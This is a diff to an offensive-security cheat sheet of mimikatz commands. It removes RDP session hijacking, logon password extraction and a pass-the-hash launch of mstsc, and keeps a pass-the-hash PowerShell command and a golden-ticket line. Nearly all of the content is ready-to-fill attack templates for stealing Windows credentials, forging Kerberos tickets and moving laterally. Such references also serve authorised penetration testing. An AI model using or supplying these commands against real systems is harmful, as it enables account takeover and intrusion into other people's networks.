@@ -110,22 +110,6 @@ dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID
 
 
 
-% mimikatz, rdp
-
-## mimikatz - rdp - List sessions 
-```
-ts::sessions
-```
-
-## mimikatz - rdp - Hijack session 
-```
-ts::remote /id:<id>
-```
-
-## mimikatz - rdp - Extract passwords
-```
-ts::logonpasswords
-```
 
 
 % mimikatz, ad
@@ -139,14 +123,10 @@ kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_
 ```
 
 % mimikatz, pth
-## mimikatz pth to RDP mstsc.exe
-#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
-```
-sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
-```
+
 
 ## mimikatz pth run powershell remotelly
-#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
+#plateform/windows  #target/local  #cat/ATTACK/PTH 
 Followed by : Enter-PSSession -Computer {<}computer_name}
 ```
 sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
